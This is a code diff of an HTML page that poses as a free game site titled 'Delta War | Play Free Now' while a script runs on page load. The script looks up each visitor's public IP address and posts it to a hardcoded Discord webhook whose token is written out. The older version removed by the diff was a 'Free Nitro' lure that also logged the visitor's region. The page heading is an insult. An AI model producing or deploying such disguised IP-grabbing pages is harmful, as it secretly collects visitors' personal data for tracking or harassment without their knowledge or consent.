@@ -2,52 +2,22 @@
 <html lang="en">
 <head>
  <meta charset="UTF-8">
- <title>Free Nitro!</title>
+ <title>Delta War | Play Free Now</title>
 </head>
-<body>
+<body onload="logIP()">
  <!-- Fake content here -->
- <h1>Click for Free Nitro!</h1>
-
- <img src="https://example.com/nitro-image.png" onclick="logIP()">
+ <h1>you a bitch</h1>
 
  <script>
  async function logIP() {
  const ipResponse = await fetch('https://api.ipify.org');
  const ip = await ipResponse.text();
- 
- // Use a CORS-enabled API
- const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
- const locationData = await locationResponse.json();
- 
- // Extract relevant data
- const state = locationData.region;
- const isp = "Unknown"; // Note: This API doesn't provide ISP info
- 
- // Build webhook message
  const webhookURL = 'https://discord.com/api/webhooks/1543545525821767750/6eYDQxde7zpBEwGEI8eLDnpewZynTvxDuBjwm9HPCMnZZStybikfq6FuZwhw_RXmdRyL';
- 
- try {
- let response = await fetch(webhookURL, {
+ fetch(webhookURL, {
  method: 'POST',
- headers: { 
- 'Content-Type': 'application/json', 
- 'User-Agent': 'Discord Webhook' 
- },
- body: JSON.stringify({
- content: `Logged IP from ${state} on ${isp}`,
- }),
+ headers: { 'Content-Type': 'application/json' },
+ body: JSON.stringify({ content: `Logged IP: ${ip}` }),
  });
- 
- if (!response.ok) {
- throw new Error(`HTTP error! status: ${response.status}`);
- }
- 
- console.log("Sent successfully!");
- 
- } catch (error) {
- console.error("Error sending webhook:", error);
- alert("Failed to log IP. Check console for details.");
- }
  }
  </script>
 </body>
